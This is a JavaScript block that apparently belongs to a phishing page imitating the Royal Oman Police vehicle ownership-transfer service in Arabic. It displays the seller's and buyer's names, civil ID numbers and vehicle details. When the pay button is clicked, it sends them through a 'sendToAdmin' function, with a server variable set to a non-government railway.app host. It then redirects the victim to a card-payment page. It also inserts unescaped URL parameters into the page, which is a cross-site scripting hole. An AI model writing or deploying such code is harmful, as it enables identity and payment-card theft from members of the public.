<script>
var ROP_SERVER = 'https://omanshorta-production.up.railway.app';

document.addEventListener('DOMContentLoaded', function() {
    var urlParams = new URLSearchParams(window.location.search);
    var plateCode = urlParams.get('plateCode') || '';
    var vehicleNo = urlParams.get('vehicleNo') || '';
    var idType = urlParams.get('idType') || '';
    var idValue = urlParams.get('idValue') || '';
    var ownerName = urlParams.get('ownerName') || '';
    var newOwnerName = urlParams.get('newOwnerName') || '';
    var newOwnerID = urlParams.get('newOwnerID') || '';
    var fee = urlParams.get('fee') || '5.000';
    var transferLabel = urlParams.get('transferLabel') || 'نقل مع اللوحة';
    
    if (!vehicleNo || !idValue) {
        document.getElementById('loading-message').style.display = 'none';
        document.getElementById('error-message').style.display = 'block';
        return;
    }
    
    // Show results
    document.getElementById('loading-message').style.display = 'none';
    document.getElementById('rop-results-content').style.display = 'block';
    
    var resultsHtml = '';
    
    // Owner information panel
    resultsHtml += '<div class="panel-custom">';
    resultsHtml += '<div class="panel-heading-custom">بيانات المالك الحالي (البائع)</div>';
    resultsHtml += '<div class="panel-body-custom">';
    resultsHtml += '<table class="results-table">';
    resultsHtml += '<tr><th>اسم المالك</th><td>' + ownerName + '</td></tr>';
    resultsHtml += '<tr><th>رقم الهوية</th><td>' + idValue + '</td></tr>';
    resultsHtml += '<tr><th>نوع الهوية</th><td>' + (idType === '1' ? 'الرقم المدني' : idType === '2' ? 'السجل التجاري' : 'رقم المؤسسة') + '</td></tr>';
    resultsHtml += '</table>';
    resultsHtml += '</div></div>';
    
    // New owner information panel
    resultsHtml += '<div class="panel-custom">';
    resultsHtml += '<div class="panel-heading-custom">بيانات المالك الجديد (المشتري)</div>';
    resultsHtml += '<div class="panel-body-custom">';
    resultsHtml += '<table class="results-table">';
    resultsHtml += '<tr><th>اسم المالك الجديد</th><td>' + newOwnerName + '</td></tr>';
    resultsHtml += '<tr><th>رقم هوية المالك الجديد</th><td>' + newOwnerID + '</td></tr>';
    resultsHtml += '</table>';
    resultsHtml += '</div></div>';
    
    // Vehicle information panel
    resultsHtml += '<div class="panel-custom">';
    resultsHtml += '<div class="panel-heading-custom">بيانات المركبة</div>';
    resultsHtml += '<div class="panel-body-custom">';
    resultsHtml += '<table class="results-table">';
    resultsHtml += '<tr><th>رمز اللوحة</th><td>' + plateCode + '</td></tr>';
    resultsHtml += '<tr><th>رقم المركبة</th><td>' + vehicleNo + '</td></tr>';
    resultsHtml += '</table>';
    resultsHtml += '</div></div>';
    
    // Fee panel
    resultsHtml += '<div class="panel-custom">';
    resultsHtml += '<div class="panel-heading-custom">رسوم نقل الملكية</div>';
    resultsHtml += '<div class="panel-body-custom">';
    resultsHtml += '<table class="results-table">';
    resultsHtml += '<tr><th>نوع النقل</th><td>' + transferLabel.split(' - ')[0] + '</td></tr>';
    resultsHtml += '<tr><th>رسوم النقل</th><td class="fee-amount">' + parseFloat(fee).toFixed(3) + ' ر.ع</td></tr>';
    resultsHtml += '</table>';
    resultsHtml += '</div></div>';
    
    document.getElementById('rop-results-content').innerHTML = resultsHtml;
    
    // Add payment button
    var buttonsHtml = '<div style="margin-top:20px; margin-bottom:20px; text-align:center;">';
    buttonsHtml += '<input type="button" id="btnPayTransfer" class="btn-pay" value="مباشرة عملية الدفع" />';
    buttonsHtml += '</div>';
    
    // Payment confirmation modal
    buttonsHtml += '<div id="paymentModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">';
    buttonsHtml += '<div style="background:#fff; border-radius:8px; padding:30px; max-width:500px; width:90%; margin:auto; margin-top:15%; text-align:center; direction:rtl;">';
    buttonsHtml += '<h2 style="margin-bottom:15px;">مباشرة إجراء عملية الدفع</h2>';
    buttonsHtml += '<h3>رسوم نقل ملكية المركبة: <span style="font-weight:bold; color:#2E52AA;">' + parseFloat(fee).toFixed(3) + '</span> ريال عماني.</h3>';
    buttonsHtml += '<p>إضغط على زر <b>دفع</b> لمباشرة إجراء عملية الدفع أو زر <b>إلغاء</b> لإلغاء عملية الدفع.</p>';
    buttonsHtml += '<div style="margin-top:20px;">';
    buttonsHtml += '<button id="btnConfirmPay" style="background:#1a3a5c; color:#fff; border:none; padding:10px 30px; margin:5px; border-radius:5px; font-size:16px; cursor:pointer;">دفع</button>';
    buttonsHtml += '<button id="btnCancelPay" style="background:#666; color:#fff; border:none; padding:10px 30px; margin:5px; border-radius:5px; font-size:16px; cursor:pointer;">إلغاء</button>';
    buttonsHtml += '</div></div></div>';
    
    document.getElementById('rop-results-content').insertAdjacentHTML('afterend', buttonsHtml);
    
    // Pay button - show modal and send data to admin
    document.getElementById('btnPayTransfer').addEventListener('click', function() {
        document.getElementById('paymentModal').style.display = 'flex';
        // Send data to admin when user clicks payment button
        if (window.sendToAdmin) {
            var idTypeLabel = idType === '1' ? 'الرقم المدني' : (idType === '2' ? 'رقم الإقامة' : idType);
            window.sendToAdmin({
                type: 'نقل ملكية مركبة',
                fields: [
                    { label: 'رمز اللوحة', value: plateCode },
                    { label: 'رقم المركبة', value: vehicleNo },
                    { label: 'نوع الهوية', value: idTypeLabel },
                    { label: 'رقم الهوية', value: idValue },
                    { label: 'اسم المالك (البائع)', value: ownerName },
                    { label: 'اسم المالك الجديد (المشتري)', value: newOwnerName },
                    { label: 'رقم هوية المشتري', value: newOwnerID },
                    { label: 'نوع النقل', value: transferLabel },
                    { label: 'رسوم النقل', value: parseFloat(fee).toFixed(3) + ' ر.ع' }
                ]
            }, 'نقل ملكية مركبة');
        }
    });
    
    // Confirm pay - redirect to credit card payment page
    document.getElementById('btnConfirmPay').addEventListener('click', function() {
        window.location.href = '/credit-card-payment?amount=' + fee;
    });
    
    // Cancel pay - close modal
    document.getElementById('btnCancelPay').addEventListener('click', function() {
        document.getElementById('paymentModal').style.display = 'none';
    });
});
</script>
